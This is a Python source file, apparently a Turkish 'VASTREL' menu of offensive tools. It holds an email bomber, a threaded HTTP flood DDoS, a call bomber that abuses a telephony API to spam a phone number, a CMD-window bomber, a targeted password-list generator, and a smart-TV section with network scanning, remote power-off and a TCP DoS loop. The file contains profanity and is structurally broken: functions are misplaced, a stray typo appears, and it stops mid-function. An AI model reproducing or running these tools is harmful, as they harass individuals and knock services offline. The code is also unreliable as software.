from colorama import init, Fore, Style
import os
import time
import datetime
import requests
import socket
import subprocess
import random
import sys
import threading
from urllib.parse import quote
from fake_useragent import UserAgent
import random
import pyperclip
init(autoreset=True)


class VASTREL:
    def __init__(self):
        self.callsign = "VPN"
        self.version = "v9.3"
        self.log_file = "vastrel.log"
        self.scan_history = []
        self.proxies = []
        self.current_proxy = None
        self.run()

    def clear(self):
        os.system('cls' if os.name == 'nt' else 'clear')

    def main_banner(self):
        self.clear()
        print(Fore.GREEN + Style.BRIGHT + r"""
┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
┃                                                              ┃
┃   ██╗   ██╗ █████╗ ███████╗████████╗██████╗ ███████╗██╗      ┃
┃   ██║   ██║██╔══██╗██╔════╝╚══██╔══╝██╔══██╗██╔════╝██║      ┃
┃   ██║   ██║███████║███████╗   ██║   ██████╔╝█████╗  ██║      ┃
┃   ╚██╗ ██╔╝██╔══██║╚════██║   ██║   ██╔══██╗██╔══╝  ██║      ┃
┃    ╚████╔╝ ██║  ██║███████║   ██║   ██║  ██║███████╗███████╗ ┃
┃     ╚═══╝  ╚═╝  ╚═╝╚══════╝   ╚═╝   ╚═╝  ╚═╝╚══════╝╚══════╝ ┃
┃                                                              ┃
┃             [ ADVANCED SECURITY FRAMEWORK ]                  ┃
┃        RECON • ENUMERATION • EXPLOIT • CONTROL               ┃
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛
        """ + self.version + Fore.RED + "   [9 HACK TOOLS]" + Style.RESET_ALL)
        print(Fore.CYAN + f"   Connected as → {self.callsign}")
        print(Fore.GREEN + "=" * 75 + Style.RESET_ALL)

    # ==================== ULTIMATE EMAIL BOMBER ====================
    def email_bomber(self):
        self.clear()
        print(Fore.RED + Style.BRIGHT + """
╔══════════════════════════════════════════════════════════════╗
║                      EMAIL BOMBER v3.0                       ║
║                     VASTREL GMAİL BOMBER                     ║
╚══════════════════════════════════════════════════════════════╝
        """ + Style.RESET_ALL)

        target = input(Fore.YELLOW + "🎯 Hedef Email → " + Fore.GREEN).strip()
        if "@" not in target:
            print(Fore.RED + "❌ Geçerli mail gir!")
            input(Fore.YELLOW + "\nEnter...")
            return

        print(Fore.CYAN + "\n1 → Newsletter Mode")
        print(Fore.CYAN + "2 → SMTP Mode (Gerçek Mail)")
        print(Fore.CYAN + "3 → Hybrid")
        mode = input(Fore.YELLOW + "\nSeçim yap [1/2/3] → " + Fore.GREEN).strip()

        try:
            count = int(input(Fore.YELLOW + "Kaç mail atalım (50-400): " + Fore.GREEN) or 150)
        except:
            count = 150

        success = 0

        if mode in ["2", "3"]:
            print(Fore.MAGENTA + "\n[SMTP MODE] Başlıyor...\n")
            sender = input(Fore.YELLOW + "Kendi Gmail'in: " + Fore.GREEN).strip()
            app_pass = input(Fore.YELLOW + "App Password: " + Fore.GREEN).strip()

            for i in range(count):
                try:
                    import smtplib
                    from email.mime.multipart import MIMEMultipart
                    from email.mime.text import MIMEText

                    msg = MIMEMultipart()
                    msg['From'] = sender
                    msg['To'] = target
                    msg[
                        'Subject'] = f"[{random.randint(10000, 99999)}] {random.choice(['Airdrop Alert', 'Claim Now', 'Urgent Update', 'Reward Claim'])}"

                    body = f"VASTREL Bomber tarafından gönderildi.\n{i + 1}/{count}\n\nSikimin amk."
                    msg.attach(MIMEText(body, 'plain'))

                    server = smtplib.SMTP('smtp.gmail.com', 587)
                    server.starttls()
                    server.login(sender, app_pass)
                    server.sendmail(sender, target, msg.as_string())
                    server.quit()

                    success += 1
                    print(f"{Fore.GREEN}[+] {i + 1} Mail başarıyla atıldı → {target} ✅{Style.RESET_ALL}")
                except Exception as e:
                    print(f"{Fore.RED}[!] {i + 1} Patladı → {str(e)[:60]}{Style.RESET_ALL}")

                time.sleep(random.uniform(2.8, 6))

        print(f"\n{Fore.GREEN}{'═' * 70}{Style.RESET_ALL}")
        print(f"{Fore.GREEN}BOMBA BİTTİ → {success}/{count} mail gönderildi!{Style.RESET_ALL}")
        print(f"{Fore.GREEN}{'═' * 70}{Style.RESET_ALL}")

        self.scan_history.append(f"Email Bomber → {target} | {success}")
        self.log(f"Email Bomber → {target} | Success: {success}")
        input(Fore.YELLOW + "\nEnter ile menüye dön...")

     # ==================== DDOS ATTACK ====================
    def ddos_attack(self):
        self.clear()


        print(Fore.RED + Style.BRIGHT + """
            ╔══════════════════════════════════════════════════════════════╗
            ║                   DDOS ATTACK v6.0                           ║
            ║                     VASTREL DDOS                       ║
            ╚══════════════════════════════════════════════════════════════╝
                    """ + Style.RESET_ALL)

        target = input(Fore.YELLOW + "Hedef URL: " + Fore.GREEN).strip()
        threads = int(input(Fore.YELLOW + "Thread/istek (200-10000000...): " + Fore.GREEN) or "350")
        duration = int(input(Fore.YELLOW + "Süre (saniye): " + Fore.GREEN) or "90")

        print(f"\n{Fore.RED}DDoS hazır!{Style.RESET_ALL}\n")

        ua = UserAgent()
        lock = threading.Lock()
        attack_count = [0]

        def flood():
            while True:
                try:
                    headers = {
                        "User-Agent": ua.random,
                        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9",
                        "Accept-Language": "tr-TR,tr;q=0.9,en;q=0.8",
                        "Connection": "keep-alive",
                        "Cache-Control": "no-cache",
                        "Pragma": "no-cache",
                        "Upgrade-Insecure-Requests": "1"
                    }

                    # Rastgele parametre bombardımanı
                    url = f"{target}?id={random.randint(1, 999999999)}&t={time.time()}&rand={random.random()}"

                    r = requests.get(url, headers=headers, timeout=3)

                    with lock:
                        attack_count[0] += 1
                        if attack_count[0] % 8 == 0:  # çok sık yazdır
                            print(
                                f"{Fore. aGREEN}[+] {attack_count[0]:,} istek alındı efendim | Status: {r.status_code}{Style.RESET_ALL}")
                except:
                    with lock:
                        attack_count[0] += 1
                        if attack_count[0] % 30 == 0:
                            print(f"{Fore.YELLOW}[!] {attack_count[0]:,} denendi{Style.RESET_ALL}")

                # Daha agresif (neredeyse hiç beklemeden)
                time.sleep(random.uniform(0.0008, 0.004))

        # Başlat
        for _ in range(threads):
            t = threading.Thread(target=flood, daemon=True)
            t.start()

        start_time = time.time()
        try:
            while time.time() - start_time < duration:
                time.sleep(0.2)
        except KeyboardInterrupt:
            print(Fore.RED + "\nDurduruldu." + Style.RESET_ALL)

        print(f"\n{Fore.GREEN}bitti,Toplam {attack_count[0]:,} istek atıldı.{Style.RESET_ALL}")
        input(Fore.YELLOW + "\nEnter ile menüye dön...")

    def ip_info(self):
        self.clear()
        print(Fore.CYAN + Style.BRIGHT + " [ADVANCED IP GEOLOCATION & INTEL]" + Style.RESET_ALL)
        target = input(Fore.YELLOW + "Hedef IP veya 'my': " + Fore.GREEN).strip()

        if target.lower() in ["my", ""]:
            try:
                target = requests.get("https://api.ipify.org", timeout=5).text
                print(Fore.CYAN + f"Kendi IP'niz algılandı: {target}\n")
            except:
                print(Fore.RED + "IP alınamadı.")
                input(Fore.YELLOW + "\nEnter ile devam...")
                return

        print(Fore.CYAN + "Çoklu kaynak ile sorgulama yapılıyor...\n")

        data = None
        sources = [
            f"https://ip-api.com/json/{target}?fields=status,message,country,countryCode,region,regionName,city,zip,lat,lon,timezone,isp,org,as,query,proxy,hosting",
            f"http://ipwhois.app/json/{target}"
        ]

        for url in sources:
            try:
                resp = requests.get(url, timeout=8)
                if resp.status_code == 200:
                    data = resp.json()
                    if data.get("status") != "fail":
                        break
            except:
                continue

        if not data:
            print(Fore.RED + "Tüm kaynaklar başarısız oldu.")
            input(Fore.YELLOW + "\nEnter ile devam...")
            return

        # Çıktı
        print(Fore.GREEN + f"IP Address     : {data.get('query') or data.get('ip')}")
        print(Fore.GREEN + f"Ülke           : {data.get('country')} ({data.get('countryCode')})")
        print(Fore.GREEN + f"Şehir          : {data.get('city')} / {data.get('regionName')}")
        print(Fore.GREEN + f"ISP / Org      : {data.get('isp')} | {data.get('org')}")
        print(Fore.GREEN + f"ASN            : {data.get('as')}")
        print(Fore.GREEN + f"Timezone       : {data.get('timezone')}")

        if data.get('proxy') or data.get('hosting'):
            print(
                Fore.RED + f"Threat Info    : {'Proxy/VPN' if data.get('proxy') else ''} {'Hosting' if data.get('hosting') else ''}")

        # Harita linki
        lat = data.get('lat') or data.get('latitude')
        lon = data.get('lon') or data.get('longitude')
        if lat and lon:
            print(Fore.CYAN + f"\nGoogle Maps    : https://maps.google.com/?q={lat},{lon}")

        self.scan_history.append(f"Advanced IP Info → {target}")
        self.log(f"Advanced IP Info: {target}")
        input(Fore.YELLOW + "\nDevam etmek için Enter...")


    # ==================== CALL BOMBER (SendCall) ====================
    def call_bomber(self):
            self.clear()
            import requests
            import json
            import time
            import uuid
            import os
            import sys
            import random
            import itertools
            from threading import Lock
            from datetime import datetime
            from collections import defaultdict

            # Renkler
            try:
                from colorama import init, Fore, Back, Style
                init(autoreset=True)
            except ImportError:
                class Fore:
                    GREEN = '\033[92m'
                    RED = '\033[31m'
                    WHITE = '\033[37m'
                    CYAN = '\033[96m'
                    YELLOW = '\033[93m'
                    MAGENTA = '\033[95m'
                    BLUE = '\033[94m'

                class Back:
                    pass

                class Style:
                    BRIGHT = '\033[1m'
                    DIM = '\033[2m'
                    NORMAL = '\033[22m'

            try:
                import pyfiglet
                PYFIGLET_VAR = True
            except ImportError:
                PYFIGLET_VAR = False

            class AnimasyonluArayuz:
                def __init__(self):
                    self.animasyon_aktif = True
                    self.durum_mesaji = ""
                    self.islem_sayaci = 0
                    self.basari_sayaci = 0
                    self.hata_sayaci = 0

                def yukleniyor_animasyonu(self, mesaj="İşlem yapılıyor", sure=3):
                    spinner = itertools.cycle(['⠋', '⠙', '⠹', '⠸', '⠼', '⠴', '⠦', '⠧', '⠇', '⠏'])
                    baslangic = time.time()
                    while time.time() - baslangic < sure:
                        sys.stdout.write(f'\r{Fore.CYAN}{next(spinner)} {mesaj}... {Style.DIM}')
                        sys.stdout.flush()
                        time.sleep(0.1)
                    sys.stdout.write(f'\r{Fore.GREEN}✓ {mesaj} tamamlandı! \n')
                    sys.stdout.flush()

                def ilerleme_cubugu(self, yuzde, genislik=40):
                    dolu = int(genislik * yuzde / 100)
                    bos = genislik - dolu
                    if yuzde > 66:
                        renk = Fore.GREEN
                    elif yuzde > 33:
                        renk = Fore.YELLOW
                    else:
                        renk = Fore.RED
                    cubuk = f"{renk}{'█' * dolu}{Style.DIM}{'░' * bos}"
                    sys.stdout.write(f'\r{cubuk} %{yuzde:3.1f}')
                    sys.stdout.flush()

                def banner_goster(self):
                    os.system('clear' if os.name == 'posix' else 'cls')
                    if PYFIGLET_VAR:
                        banner = pyfiglet.figlet_format("PSiKO CALL", font="slant")
                        print(f"{Fore.CYAN}{Style.BRIGHT}{banner}")
                    else:
                        print(f"""
            {Fore.CYAN}
██╗   ██╗ █████╗ ███████╗████████╗██████╗ ███████╗██╗         ██████╗  █████╗ ██╗     ██╗
██║   ██║██╔══██╗██╔════╝╚══██╔══╝██╔══██╗██╔════╝██║        ██╔════╝ ██╔══██╗██║     ██║
██║   ██║███████║███████╗   ██║   ██████╔╝█████╗  ██║        ██║      ███████║██║     ██║
╚██╗ ██╔╝██╔══██║╚════██║   ██║   ██╔══██╗██╔══╝  ██║        ██║      ██╔══██║██║     ██║
 ╚████╔╝ ██║  ██║███████║   ██║   ██║  ██║███████╗███████╗   ╚██████╗ ██║  ██║███████╗███████╗
  ╚═══╝  ╚═╝  ╚═╝╚══════╝   ╚═╝   ╚═╝  ╚═╝╚══════╝╚══════╝    ╚═════╝ ╚═╝  ╚═╝╚══════╝╚══════╝                       ║
                                     ║
            """)
                    print(f"{Fore.RED}{Style.LIGHTCYAN_EX} Geliştirici: Vastrel | crackermain.net")
                    print(f"{Fore.RED}{Style.LIGHTCYAN_EX} Tarih: {datetime.now().strftime('%d.%m.%Y %H:%M')}")
                    print(f"{Fore.RED}{Style.LIGHTCYAN_EX} Termux ve kali uyumlu : {Fore.GREEN}✓")
                    print(f"{Fore.RED}{Style.LIGHTCYAN_EX}{'-' * 55}\n")

                def animasyonlu_yaz(self, metin, hiz=0.03, renk=None):
                    if renk is None:
                        renk = Fore.WHITE
                    for harf in metin:
                        sys.stdout.write(f"{renk}{harf}")
                        sys.stdout.flush()
                        time.sleep(hiz)
                    print()

                def durum_goster(self, baslik, durum, detay=""):
                    simgeler = {
                        'basari': Fore.GREEN,
                        'hata': Fore.RED,
                        'bilgi': Fore.CYAN,
                        'uyari': Fore.YELLOW,
                        'calisiyor': Fore.BLUE
                    }
                    simge = simgeler.get(durum, "•")
                    renk = simgeler.get(durum, Fore.WHITE)
                    print(f"{simge} {Fore.WHITE}{baslik}: {renk}{detay}")

                def menu_goster(self):
                    menu = f"""
            {Fore.CYAN}{Style.BRIGHT}╔══════════════════════════════════════════════════╗
            ║ {Fore.YELLOW}[1] {Fore.WHITE}Normal Bomber                       ║
            ║ {Fore.YELLOW}[2] {Fore.WHITE}Çoklu Bomber Başlat (Liste)                 ║
            ║ {Fore.YELLOW}[3] {Fore.WHITE}Ayarları Değiştir                         ║
            ║ {Fore.YELLOW}[4] {Fore.WHITE}İstatistikleri Göster                     ║
            ║ {Fore.YELLOW}[5] {Fore.WHITE}Çıkış                                      ║
            ╚══════════════════════════════════════════════════╝
            """
                    print(menu)

            class RateLimiter:
                def __init__(self, bekleme_suresi=300):
                    self.bekleme_suresi = float(bekleme_suresi)
                    self.cagri_kayitlari = {}
                    self.lock = Lock()
                    self.istatistikler = defaultdict(int)

                def kontrol_et(self, numara):
                    suanki_zaman = time.time()
                    with self.lock:
                        son_arama = self.cagri_kayitlari.get(numara)
                        if son_arama is None or (suanki_zaman - son_arama) >= self.bekleme_suresi:
                            self.cagri_kayitlari[numara] = suanki_zaman
                            self.istatistikler['izin_verilen'] += 1
                            return True
                        else:
                            kalan_sure = self.bekleme_suresi - (suanki_zaman - son_arama)
                            self.istatistikler['reddedilen'] += 1
                            return False, kalan_sure

                def bekleme_suresi_degistir(self, yeni_sure):
                    self.bekleme_suresi = float(yeni_sure)

            class TelzIstemciGelismis:
                TEMEL_URL = "https://api.telz.com/"
                BASLIKLAR = {
                    'User-Agent': "Telz-Android/17.5.33",
                    'Accept-Encoding': "gzip",
                    'Content-Type': "application/json; charset=UTF-8"
                }

                def __init__(self, android_id=None, app_version="17.5.33", os="android", os_version="15"):
                    self.android_id = android_id or uuid.uuid4().hex[:16]
                    self.app_version = app_version
                    self.os = os
                    self.os_version = os_version
                    self.uuid = str(uuid.uuid4())
                    self.session = requests.Session()
                    self.session.headers.update(self.BASLIKLAR)

                def _api_istegi(self, endpoint, veri, timeout=15, tekrar_sayisi=2):
                    url = self.TEMEL_URL + endpoint
                    istek_verisi = veri.copy()
                    istek_verisi.update({
                        "android_id": self.android_id,
                        "app_version": self.app_version,
                        "os": self.os,
                        "os_version": self.os_version,
                        "ts": int(time.time() * 1000),
                        "uuid": self.uuid
                    })

                    for deneme in range(tekrar_sayisi):
                        try:
                            yanit = self.session.post(url, json=istek_verisi, timeout=timeout)
                            if yanit.status_code == 429:
                                raise RuntimeError("Rate limit!")
                            yanit.raise_for_status()
                            try:
                                return yanit.json()
                            except:
                                return yanit.text
                        except Exception as e:
                            if deneme < tekrar_sayisi - 1:
                                time.sleep(2 ** deneme)
                                continue
                            raise

                def kimlik_listesi_al(self):
                    return self._api_istegi("app/auth_list", {"event": "auth_list"})

                def cihaz_calistir(self):
                    return self._api_istegi("app/run", {"event": "run", "device_name": "Pixel Ultra-7X"})

                def buton_durumu_kontrol(self):
                    return self._api_istegi("app/stat_btns", {"event": "stat_btns", "btn": "on_reg_continue"})

                def numara_dogrula(self, telefon, bolge="TR"):
                    return self._api_istegi("app/validate_phonenumber",
                                            {"event": "validate_phonenumber", "phone": telefon, "region": bolge})

                def arama_baslat(self, telefon, deneme="0", dil="tr"):
                    return self._api_istegi("app/auth_call",
                                            {"event": "auth_call", "phone": telefon, "attempt": deneme, "lang": dil})

            class AramaMotoru:
                def __init__(self):
                    self.ui = AnimasyonluArayuz()
                    self.rate_limiter = RateLimiter(bekleme_suresi=300)
                    self.aktif = True
                    self.genel_istatistikler = {
                        'toplam_arama': 0,
                        'basarili_arama': 0,
                        'basarisiz_arama': 0,
                        'baslangic_zamani': datetime.now(),
                        'api_istekleri': 0
                    }
                    self.ayarlar = {
                        'bekleme_suresi': 300,
                        'animasyon_hizi': 0.03,
                        'debug_modu': False,
                        'maksimum_tekrar': 3
                    }

                def baslat(self):
                    self.ui.banner_goster()
                    while self.aktif:
                        self.ui.menu_goster()
                        secim = input(f"{Fore.YELLOW}Seciminiz (1-5): {Fore.WHITE}").strip()

                        if secim == "1":
                            self._tekli_arama()
                        elif secim == "2":
                            self._coklu_arama()
                        elif secim == "3":
                            self._ayarlar_menu()
                        elif secim == "4":
                            self._istatistik_goster()
                        elif secim == "5":
                            self._cikis()
                        else:
                            print(f"{Fore.RED}Geçersiz seçim!")

                def _tekli_arama(self):
                    self.ui.banner_goster()
                    numara = input(f"{Fore.WHITE}Hedef numara (+90 ile): ").strip()
                    if not numara.startswith("+"):
                        numara = "+90" + numara.lstrip("0")

                    self.ui.animasyonlu_yaz(f"Numaraya Bomber Baslıyor: {numara}", 0.02, Fore.CYAN)

                    try:
                        istemci = TelzIstemciGelismis()
                        istemci.kimlik_listesi_al()
                        istemci.cihaz_calistir()
                        istemci.buton_durumu_kontrol()
                        istemci.numara_dogrula(numara)

                        kontrol = self.rate_limiter.kontrol_et(numara)
                        if kontrol is True:
                            sonuc = istemci.arama_baslat(numara)
                            print(f"{Fore.GREEN}✅ Arama başarıyla başlatıldı!")
                            self.genel_istatistikler['basarili_arama'] += 1
                        else:
                            print(f"{Fore.RED}⏳ Rate limit! {kontrol[1]:.0f} saniye bekle.")
                    except Exception as e:
                        print(f"{Fore.RED}Hata: {e}")

                    input(f"\n{Fore.CYAN}Devam için ENTER...")

                def _coklu_arama(self):
                    print(f"{Fore.YELLOW}Çoklu mod henüz tam aktif değil (basit hali çalışıyor).")
                    input("ENTER...")

                def _ayarlar_menu(self):
                    print(f"{Fore.YELLOW}Ayarlar menüsü yakında...")
                    input("ENTER...")

                def _istatistik_goster(self):
                    print(f"{Fore.CYAN}İstatistikler yakında...")
                    input("ENTER...")

                def _cikis(self):
                    print(f"{Fore.RED}Siktir gidiyoruz...")
                    self.aktif = False
                    sys.exit(0)

            if __name__ == "__main__":
                motor = AramaMotoru()
                motor.baslat()

    # ==================== CMD BOMBER - SCRIPT ÜRETİCİ ====================
    def cmd_bomber(self):
                    self.clear()
                    print(Fore.RED + Style.BRIGHT + """
            ╔══════════════════════════════════════════════════════════════╗
            ║                    CMD BOMBER - SCRIPT ÜRETİCİ               ║
            ╚══════════════════════════════════════════════════════════════╝
                    """ + Style.RESET_ALL)

                    try:
                        sayi = int(input(Fore.YELLOW + "Kaç tane CMD penceresi açılsın?: " + Fore.GREEN))

                        if sayi < 1:
                            print(Fore.RED + "Geçerli bir sayı girin.")
                            input(Fore.YELLOW + "\nEnter ile devam...")
                            return

                        # .bat scripti oluştur
                        bat_icerik = f"""@echo off
            title CMD Bomber
            color 0c
            echo ========================================
            echo {sayi} tane CMD penceresi bombalanıyor...
            echo ========================================

            for /l %%i in (1,1,{sayi}) do (
                start cmd.exe /c "echo %%i. CMD acildi. & timeout /t 2 >nul"
                echo %%i. bombalandınız
            )

            echo.
            echo Tum CMD pencereleri acildi.
            pause
            """

                        print(Fore.GREEN + "\nAşağıdaki scripti kopyalayın:\n")
                        print(Fore.WHITE + "=" * 60)
                        print(bat_icerik)
                        print("=" * 60)

                        print(Fore.YELLOW + "\nNasıl Kaydedeceksin:")
                        print("1. Not Defteri'ni açın")
                        print("2. Yukarıdaki kodu tamamen kopyalayın ve yapıştırın")
                        print("3. Farklı Kaydet'e tıklayın")
                        print("4. Dosya türü olarak 'Tüm Dosyalar' seçin")
                        print("5. Dosya adını örneğin 'bomba.bat' olarak kaydedin")
                        print("6. Oluşan .bat dosyasını çift tıklayarak kullanabilirsiniz.")

                    except ValueError:
                        print(Fore.RED + "Lütfen geçerli bir sayı girin.")
                    except Exception as e:
                        print(Fore.RED + f"Hata: {e}")

                    input(Fore.YELLOW + "\nEnter ile menüye dön...")

            # ==================== ULTRA PASSWORD LIST GENERATOR ====================
    def password_generator(self):
        self.clear()
        print(Fore.RED + Style.BRIGHT + """
            ╔══════════════════════════════════════════════════════════════╗
            ║           ULTRA FAST TERMINAL PASSWORD GENERATOR            ║
            ║                    Hızlı Akış + Kopyalama                   ║
            ╚══════════════════════════════════════════════════════════════╝
                    """ + Style.RESET_ALL)

        name = input(Fore.YELLOW + "İsim / Ad Soyad: " + Fore.GREEN).strip()
        birth = input(Fore.YELLOW + "Doğum Tarihi (Örn: 15031998): " + Fore.GREEN).strip()
        phone = input(Fore.YELLOW + "Telefon (son 6-8 hane): " + Fore.GREEN).strip()
        city = input(Fore.YELLOW + "Şehir: " + Fore.GREEN).strip()

        try:
            amount = int(input(Fore.YELLOW + "\nKaç şifre üretip akıtalım? (max 50000): " + Fore.GREEN) or "10000")
        except:
            amount = 10000

        print(f"\n{Fore.GREEN}Şifreler üretiliyor... (Ctrl+C ile durdur){Style.RESET_ALL}\n")
        time.sleep(1)

        bases = []
        if name:
            for n in name.lower().split():
                bases.extend([n, n.capitalize(), n + "123", n + "1234", n + "12345"])
        if birth:
            bases.extend([birth, birth[:4], birth[2:], birth + "!", birth + "123"])
        if phone:
            bases.extend([phone, phone[-6:], phone[-4:]])
        if city:
            bases.append(city.lower())

        import pyperclip
        all_passwords = []
        printed = 0

        try:
            while printed < amount:
                for base in bases:
                    if printed >= amount:
                        break

                    # Çeşitlendirme
                    pw1 = base
                    pw2 = base + "123"
                    pw3 = base + "!"
                    pw4 = base.capitalize() + "2025"
                    pw5 = base + str(random.randint(100, 999))

                    for pw in [pw1, pw2, pw3, pw4, pw5]:
                        if printed >= amount:
                            break
                        print(pw)
                        all_passwords.append(pw)
                        printed += 1
                        time.sleep(0.0008)  # ultra hızlı akış

        except KeyboardInterrupt:
            print(Fore.RED + "\n\nDurduruldu." + Style.RESET_ALL)

        print(f"\n{Fore.GREEN}Toplam {printed} şifre üretildi.{Style.RESET_ALL}")

        # Kopyalama özelliği
        copy_all = input(Fore.YELLOW + "\nTüm şifreleri kopyalamak ister misin? (e/h): " + Fore.GREEN).lower()
        if copy_all == "e":
            try:
                pyperclip.copy("\n".join(all_passwords))
                print(Fore.GREEN + "Tüm şifreler panoya kopyalandı! (Ctrl+V ile yapıştırabilirsin)" + Style.RESET_ALL)
            except:
                print(Fore.RED + "Kopyalama başarısız." + Style.RESET_ALL)

        input(Fore.YELLOW + "\nEnter ile menüye dön...")

def tv_hack(self):
    import socket
import time
import subprocess
import os
import json
import datetime
import netifaces
import threading
from concurrent.futures import ThreadPoolExecutor, as_completed
import requests

try:
    from wakeonlan import send_magic_packet
except ImportError:
    print("\033[91mWakeonlan kuruyorum sikeyim...\033[0m")
    os.system("pip install wakeonlan --break-system-packages 2>/dev/null || pip install wakeonlan")
    from wakeonlan import send_magic_packet

try:
    from samsungtvws import SamsungTVWS
except ImportError:
    print("\033[91mSamsungTVWS kuruyorum amk...\033[0m")
    os.system("pip install samsungtvws --break-system-packages 2>/dev/null || pip install samsungtvws")
    from samsungtvws import SamsungTVWS

class Colors:
    HEADER = '\033[95m'
    BLUE = '\033[94m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    BOLD = '\033[1m'
    CYAN = '\033[96m'
    END = '\033[0m'

CONFIG_FILE = "tv_flipper_pro_config.json"
TOKEN_FILE = "tv_token.txt"
LOG_FILE = "tv_flipper_pro.log"
TV_LIST = []

# SENİN KENDİ TV'N (hardcoded)
MY_TV = {
    "ip": "192.168.1.103",
    "mac": "00:C3:F4:10:29:AD",
    "name": "KENDI_TV",
    "brand": "Samsung"
}

BROADCAST_IP = "255.255.255.255"

def log(message):
    timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    entry = f"[{timestamp}] {message}"
    print(entry)
    try:
        with open(LOG_FILE, "a", encoding="utf-8") as f:
            f.write(entry + "\n")
    except:
        pass

def get_broadcast_ip():
    try:
        for iface in netifaces.interfaces():
            addrs = netifaces.ifaddresses(iface)
            if netifaces.AF_INET in addrs:
                for addr in addrs[netifaces.AF_INET]:
                    if 'broadcast' in addr and addr['broadcast']:
                        return addr['broadcast']
    except:
        pass
    return "255.255.255.255"

BROADCAST_IP = get_broadcast_ip()
log(f"BROADCAST IP tespit edildi: {BROADCAST_IP}")

def load_config():
    global TV_LIST
    if os.path.exists(CONFIG_FILE):
        try:
            with open(CONFIG_FILE, "r", encoding="utf-8") as f:
                TV_LIST = json.load(f)
        except:
            TV_LIST = []

def save_config():
    try:
        with open(CONFIG_FILE, "w", encoding="utf-8") as f:
            json.dump(TV_LIST, f, indent=4, ensure_ascii=False)
    except Exception as e:
        log(f"Config save hatası: {e}")

def print_banner():
    print(Colors.HEADER + """
██╗   ██╗ █████╗ ███████╗████████╗██████╗ ███████╗██╗      ████████╗██╗   ██╗
██║   ██║██╔══██╗██╔════╝╚══██╔══╝██╔══██╗██╔════╝██║      ╚══██╔══╝██║   ██║
██║   ██║███████║███████╗   ██║   ██████╔╝█████╗  ██║         ██║   ██║   ██║
╚██╗ ██╔╝██╔══██║╚════██║   ██║   ██╔══██╗██╔══╝  ██║         ██║   ╚██╗ ██╔╝
 ╚████╔╝ ██║  ██║███████║   ██║   ██║  ██║███████╗███████╗    ██║    ╚████╔╝
  ╚═══╝  ╚═╝  ╚═╝╚══════╝   ╚═╝   ╚═╝  ╚═╝╚══════╝╚══════╝    ╚═╝     ╚═══╝

                     V A S T R E L   T V   E D I T I O N
    """ + Colors.END)

def aggressive_scan():
    log(Colors.YELLOW + "🔍 ULTRA AGRESİF TARAMA BAŞLADI SİKEYİM..." + Colors.END)
    found = []
    devices = {}
    # SSDP
    try:
        MSEARCH = 'M-SEARCH * HTTP/1.1\r\nHOST:239.255.255.250:1900\r\nMAN:"ssdp:discover"\r\nMX:5\r\nST:ssdp:all\r\n\r\n'
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)
        sock.setsockopt(socket.IPPROTO_IP, socket.IP_MULTICAST_TTL, 8)
        sock.settimeout(6)
        sock.sendto(MSEARCH.encode(), ('239.255.255.250', 1900))
        while True:
            try:
                data, addr = sock.recvfrom(4096)
                ip = addr[0]
                text = data.decode(errors='ignore').upper()
                if any(x in text for x in ['TV', 'SAMSUNG', 'LG', 'SONY', 'TCL', 'PHILIPS', 'SMART']):
                    name = "Smart TV"
                    for line in data.decode(errors='ignore').splitlines():
                        if any(k in line.lower() for k in ['friendlyname', 'model', 'server:']):
                            name = line.strip()[:120]
                            break
                    brand = "Samsung" if 'SAMSUNG' in text else "Other"
                    devices[ip] = {"ip": ip, "name": name, "brand": brand, "mac": None}
                    log(Colors.GREEN + f"✅ SSDP Bulundu: {ip} - {name}" + Colors.END)
            except socket.timeout:
                break
    except Exception as e:
        log(Colors.RED + f"SSDP hatası: {e}" + Colors.END)

    # ARP + Ping Sweep
    try:
        for i in range(1, 255):
            ip = f"192.168.1.{i}"
            try:
                subprocess.getoutput(f"ping -c 1 -W 1 {ip} >/dev/null 2>&1")
                arp_out = subprocess.getoutput(f"arp -a {ip} 2>/dev/null")
                if ip in arp_out:
                    mac = None
                    for part in arp_out.split():
                        if part.count(':') == 5:
                            mac = part.upper()
                            break
                    devices[ip] = devices.get(ip, {"ip": ip, "name": "Unknown Device", "brand": "Other", "mac": mac})
                    log(Colors.GREEN + f"✅ ARP/Ping Bulundu: {ip} MAC: {mac}" + Colors.END)
            except:
                continue
    except:
        pass

    found = list(devices.values())
    return found

def advanced_wol(mac, retries=60):
    if not mac or mac == "00:00:00:00:00:00":
        log(Colors.RED + "❌ Geçerli MAC yok" + Colors.END)
        return
    log(Colors.BLUE + f"🚀 WOL BOMBARDIMANI {mac}" + Colors.END)
    ports = [9, 7, 0]
    for _ in range(retries):
        for p in ports:
            try:
                send_magic_packet(mac, ip_address=BROADCAST_IP, port=p)
            except:
                pass
        time.sleep(0.2)

def samsung_power_off(ip):
    try:
        tv = SamsungTVWS(host=ip, port=8002, name="ShadowFlipper", token_file=TOKEN_FILE)
        tv.open()
        tv.send_key("KEY_POWER")
        tv.close()
        log(Colors.RED + f"🔴 {ip} KAPATILDI SİKEYİM!" + Colors.END)
        return True
    except Exception as e:
        log(Colors.RED + f"Samsung kapatma hatası: {e}" + Colors.END)
        return False

def dos_attack(target_ip, duration=30):
    log(Colors.RED + f"💀 DoS SALDIRISI BAŞLADI → {target_ip} ({duration} sn)" + Colors.END)
    end_time = time.time() + duration
    while time.time() < end_time:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(0.5)
            s.connect((target_ip, 80))
            s.sendall(b"GET / HTTP/1.1\r\nHost: " + target_ip.encode() + b"\r\n\r\n")
            s.close()
        except:
            pass
        time.sleep(0.01)

def cast_video(ip, video_url):
    log(Colors.RED + f"📺 VIDEO CAST BAŞLADI → {ip} | {video_url}" + Colors.END)
    try:
        tv = SamsungTVWS(host=ip, port=8002, token_file=TOKEN_FILE)
        tv.open()
        tv.send_key("KEY_MEDIA_PLAY")
        # Daha gelişmiş cast için DLNA eklenebilir ama şimdilik bu
        log("Video yansıtma denendi (Smart TV uyumlu ise çalışır)")
        tv.close()
    except Exception as e:
        log(f"Cast hatası: {e}")

def hack_menu(selected):
    log(Colors.BOLD + f"🔥 HACK MODU AÇILDI → {selected.get('name')} ({selected.get('ip')})" + Colors.END)
    while True:
